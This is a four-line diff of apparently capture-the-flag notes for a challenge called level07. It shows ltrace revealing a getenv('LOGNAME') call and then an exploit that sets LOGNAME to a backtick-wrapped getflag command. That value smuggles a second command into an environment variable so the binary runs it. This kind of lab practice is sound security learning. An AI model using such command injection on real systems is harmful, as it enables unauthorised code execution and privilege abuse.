@@ -1,0 +1,4 @@
+- ltrace ./level07
+- we see getenv("LOGNAME")
+- export LOGNAME='`getflag`'
+- ./level07
